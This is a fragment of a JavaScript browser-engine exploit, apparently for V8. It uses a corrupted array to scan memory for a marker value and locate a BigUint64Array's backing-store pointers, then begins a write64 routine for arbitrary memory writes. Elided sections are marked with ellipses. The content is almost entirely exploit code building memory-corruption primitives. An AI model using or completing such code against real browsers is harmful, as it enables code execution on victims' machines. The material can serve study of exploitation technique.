...
print('[+] corrupted array length: ' + corrupted_array.length.toString(16));
...
for(var i = 0; i < maxSize; i++){
	// print(hex(f2i(corrupted_array[i])));
	if(f2i(corrupted_array[i]) == 0x1234){
		print("find our BigUint64Array");
		floatArrayBigBaseIdx = i + 12;
        floatArrayBigExternalIdx = i + 11;
        floatArrayBigLenIdx = i+10;
        print("[+] float idx of big uint array base addr is: "+hex(floatArrayBigBaseIdx));
        print("[+] float idx of big uint array external addr is: "+hex(floatArrayBigExternalIdx));
        break;
	}
}
...
function write64(addr, val){
    ...
    // print(hex(f2i(corrupted_array[floatArrayBigExternalIdx]) + f2i(corrupted_array[floatArrayBigBaseIdx])));
